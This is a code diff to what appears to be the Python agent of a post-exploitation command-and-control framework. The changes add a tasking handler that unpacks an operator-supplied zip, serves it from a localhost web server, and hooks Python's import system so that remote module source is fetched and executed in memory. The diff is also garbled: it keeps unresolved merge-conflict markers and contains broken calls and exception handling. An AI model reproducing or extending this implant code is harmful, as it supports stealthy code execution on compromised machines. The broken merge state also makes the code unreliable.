@@ -1,6 +1,8 @@
 import __future__
+#from __future__ import unicode_literals
 import zipfile
 import io
+from HTMLParser import HTMLParser
 from urllib import urlopen
 import struct, time, base64, subprocess, random, time, datetime
 from os.path import expanduser
@@ -36,12 +38,13 @@ jitter = 0.0
 lostLimit = 60
 missedCheckins = 0
 jobMessageBuffer = ""
-
 # killDate form -> "MO/DAY/YEAR"
 killDate = "" 
+_installed_meta_cache = { }
 # workingHours form -> "9:00-17:00"
 workingHours = ""
-
+meta_path = ""
+t = ""
 parts = profile.split("|")
 taskURIs = parts[0].split(",")
 userAgent = parts[1]
@@ -409,9 +412,22 @@ def processPacket(taskingID, data):
         pass
 
     elif taskingID == 122:
+<<<<<<< HEAD
         try:
             #base64 and decompress the data.
 
+=======
+        
+        try:
+            t.kill()
+            if meta_path:
+                remove_meta(meta_path)
+        except:
+            pass
+
+        try:
+            #base64 and decompress the data. Then encode it again?
+>>>>>>> b5697fc66b1f23c0331192c93a64579b5cc0587c
             parts = data.split('|')
             fileName = parts[0]
             base64part = parts[1]
@@ -421,6 +437,7 @@ def processPacket(taskingID, data):
             if not dec_data['crc32_check']:
                 sendMessage(encodePacket(122, "[!] WARNING: Module import failed crc32 check during decompressing!."))
                 sendMessage(encodePacket(122, "[!] HEADER: Start crc32: %s -- Received crc32: %s -- Crc32 pass: %s!." %(dec_data['header_crc32'],dec_data['dec_crc32'],dec_data['crc32_check'])))
+<<<<<<< HEAD
         except:
             sendec_datadMessage(encodePacket(122, "[!] Error in Importing module %s during upload: %s" %(fileName, str(e)) ))
 
@@ -457,6 +474,19 @@ def processPacket(taskingID, data):
             except Exception as e:
                 msg = "Unable to retrieve repo contents: %s" % (str(e))
                 sendMessage(encodePacket(124, msg))
+=======
+        except Exception as e:
+            sendec_datadMessage(encodePacket(122, "[!] Error in Importing module %s during upload: %s" %(fileName, str(e)) ))
+
+        port = random.randrange(1025,65535)
+        print "Started webserver"
+        #dec_data = base64.b64encode(dec_data)
+        start_modulewebserver(dec_data['data'], '127.0.0.1', port)
+        meta_path = "http://127.0.0.1:"+str(port)
+        print "Installing meta path"
+        install_meta(meta_path)
+        sendMessage(encodePacket(122, "import of %s successful" %(fileName) ))
+>>>>>>> b5697fc66b1f23c0331192c93a64579b5cc0587c
 
     else:
         return encodePacket(0, "invalid tasking ID: %s" %(taskingID))
@@ -573,6 +603,143 @@ def install_hook(repoName):
 def remove_hook(repoName):
     if repoName in _meta_cache:
         finder = _meta_cache.pop(repoName)
+        sys.meta_path.remove(finder)
+
+################################################
+#
+# Custom Web Importer
+#
+################################################
+
+def _get_links(url):
+    class LinkParser(HTMLParser):
+        def handle_starttag(self, tag, attrs):
+            if tag == 'a':
+                attrs = dict(attrs)
+                links.add(attrs.get('href').rstrip('/'))
+    links = set()
+    try:
+        u = urlopen(url)
+        parser = LinkParser()
+        parser.feed(u.read().decode('utf-8'))
+    except Exception as e:
+        pass
+
+    return links
+
+class UrlMetaFinder(object):
+    
+    def __init__(self, baseurl):
+        self._baseurl = baseurl
+        self._links = { }
+        self._loaders = { baseurl : UrlModuleLoader(baseurl) }
+
+    def find_module(self, fullname, path=None):
+        if path is None:
+            baseurl = self._baseurl
+        else:
+            if not path[0].startswith(self._baseurl):
+                return None
+            baseurl = path[0]
+        parts = fullname.split('.')
+        basename = parts[-1]
+        #check the link cache
+        if basename not in self._links:
+            self._links[baseurl] = _get_links(baseurl)
+        #check if it's a package
+        if basename in self._links[baseurl]:
+            fullurl = self._baseurl + '/' + basename
+            #Attempt to load the package (which accesses __init__.py)
+            loader = UrlPackageLoader(fullurl)
+            try:
+                loader.load_module(fullname)
+                self._links[fullurl] = _get_links(fullurl)
+                self._loaders[fullurl] = UrlModuleLoader(fullurl)
+            except ImportError as e:
+                loader = None
+            return loader
+
+        filename = basename + '.py'
+        if filename in self._links[baseurl]:
+            return self._loaders[baseurl]
+        else:
+            return None
+
+    def invalidate_caches(self):
+        self._links.clear()
+
+class UrlModuleLoader(object):
+    
+    def __init__(self, baseurl):
+        self._baseurl = baseurl
+        self._source_cache = {}
+
+    def module_repr(self, module):
+        return '<urlmodule %r from %r>' % (module.__name__, module.__file__)
+
+    def load_module(self, fullname):
+        code = self.get_code(fullname)
+        mod = sys.modules.setdefault(fullname, imp.new_module(fullname))
+        mod.__file__ = self.get_filename(fullname)
+        mod.__loader__ = self
+        if fullname == fullname.split('.')[0]:
+            mod.__package__ = fullname.rpartition('.')[2]
+        else:
+            mod.__package__ = fullname.rpartition('.')[0]
+        print "Loading module with exec call"
+        exec(code, mod.__dict__)
+        return mod
+
+    def get_code(self, fullname):
+        print "Obtaining source code for module"
+        src = self.get_source(fullname)
+        return compile(src, self.get_filename(fullname), 'exec')
+
+    def get_data(self, path):
+        pass
+
+    def get_filename(self, fullname):
+        return self._baseurl + '/' + fullname.split('.')[-1] + '.py'
+
+    def get_source(self, fullname):
+        filename = self.get_filename(fullname)
+        if filename in self._source_cache:
+            return self._source_cache[filename]
+        try:
+            u = urlopen(filename)
+            source = u.read().decode('ascii')
+            self._source_cache[filename] = source
+            return source
+        except e:
+            raise ImportError("Can't load %s" % filename)
+
+    def is_package(self, fullname):
+        return False
+
+class UrlPackageLoader(UrlModuleLoader):
+
+    def load_module(self, fullname):
+        mod = super(UrlPackageLoader, self).load_module(fullname)
+        mod.__path__ = [self._baseurl]
+        mod.__package__ = fullname
+
+    def get_filename(self, fullname):
+        return self._baseurl + '/' + '__init__.py'
+
+    def is_package(self, fullname):
+        return True
+
+
+def install_meta(address):
+    print "Installed meta_finder"
+    if address not in _installed_meta_cache:
+        finder = UrlMetaFinder(address)
+        _installed_meta_cache[address] = finder
+        sys.meta_path.append(finder)
+
+def remove_meta(address):
+    if address in _installed_meta_cache:
+        finder = _installed_meta_cache.pop(address)
         sys.meta_path.remove(finder)
 
 ################################################
@@ -805,6 +972,12 @@ def start_webserver(data, ip, port, serveCount):
     t.start()
     return
 
+def start_modulewebserver(data, ip, port):
+    # thread modulewebserver for execution
+    t = KThread(target=module_webserver, args=(data, ip, port))
+    t.start()
+    return
+
 def data_webserver(data, ip, port, serveCount):
     # hosts a file on port and IP servers data string
     hostName = str(ip) 
@@ -831,6 +1004,100 @@ def data_webserver(data, ip, port, serveCount):
         pass
     httpServer.server_close()
     return
+
+
+def module_webserver(data, ip, port):
+    #host a python module on a webserver for the Custom web importer
+    print "In module_webserver"
+    hostName = str(ip)
+    portNumber = int(port)
+    zf = zipfile.ZipFile(io.BytesIO(data), "r")
+    paths = zf.namelist()
+    class serverHandler(BaseHTTPServer.BaseHTTPRequestHandler):
+        def do_GET(self):
+            """Respond to a GET request"""
+            response = ""
+            filesDirs = []
+            mimetype = 'text/html'
+            trimPath = self.path.lstrip('/')
+            if self.path == '/':
+                #show all available directories and files at the root path 
+                for content in paths:
+                    if os.path.splitext(content.split(self.path)[0])[-1] != '':
+                        filesDirs.append(content.split(self.path)[0])
+                    else:
+                        filesDirs.append(content.split(self.path)[0]+"/")
+                    #remove dups
+                filesDirs = list(set(filesDirs))
+                for path in filesDirs:
+                    response += "<li><a href='%s'>%s</a>\r\n" % (path,path)
+                print "%s 200" % self.requestline
+                self.send_response(200)
+                self.send_header('Content-type', mimetype)
+                self.end_headers()
+                self.wfile.write(response.decode('ascii'))
+            elif self.path.endswith('/'):
+                for content in paths:
+                    if content == content.split(trimPath)[0]:
+                        continue
+                    if os.path.splitext(content.split(trimPath)[-1])[-1] != '':
+                        filesDirs.append(content.split(trimPath)[-1])
+                    else:
+                        filesDirs.append(content.split(trimPath)[-1])
+                if len(filesDirs) != 0:
+                    for path in filesDirs:
+                        response += "<li><a href='%s'>%s</a>\r\n" % (path,path)
+                    print "%s 200" % self.requestline
+                    self.send_response(200)
+                    self.send_header('Content-type', mimetype)
+                    self.end_headers()
+                    self.wfile.write(response.decode('ascii'))
+                else:
+                    print "%s 404" % self.requestline
+                    self.send_response(404)
+                    self.send_header('Content-type', 'text/plain')
+                    self.end_headers()
+                    self.wfile.write("file not found")
+            elif self.path.endswith('.py'):
+                print "%s 200" % self.requestline
+                try:
+                    response = zf.open(trimPath, 'r').read()
+                    self.send_response(200)
+                    self.send_header('Content-type', 'text/plain')
+                    self.end_headers()
+                    self.wfile.write(response.decode('ascii'))
+                except:
+                    print "%s 404" % self.requestline
+                    self.send_response(404)
+                    self.send_header('Content-type', 'text/plain')
+                    self.end_headers()
+                    self.wfile.write('file not found')
+            elif self.path.endswith(''):
+                print "%s 301" % self.requestline
+                self.send_response(301)
+                self.send_header("Location", "http://%s:%s%s/" % (hostName,port,self.path))
+                self.end_headers()
+            else:
+                try:
+                    response = zf.open(trimPath, 'r').read()
+                    print "%s 200" % self.requestline
+                    self.send_response(200)
+                    self.send_header('Content-type', 'text/plain')
+                    self.end_headers()
+                    self.wfile.write(response.decode('ascii'))
+                except:
+                    print "%s 404" % self.requestline
+                    self.send_response(404)
+                    self.send_header('Content-type', 'text/plain')
+                    self.end_headers()
+                    self.wfile.write('file not found') 
+
+        def log_message(s, format, *args):
+            return
+
+    server_class = BaseHTTPServer.HTTPServer
+    httpServer = server_class((hostName,portNumber), serverHandler)
+    httpServer.serve_forever()
 
 # additional implementation methods
 def run_command(command):
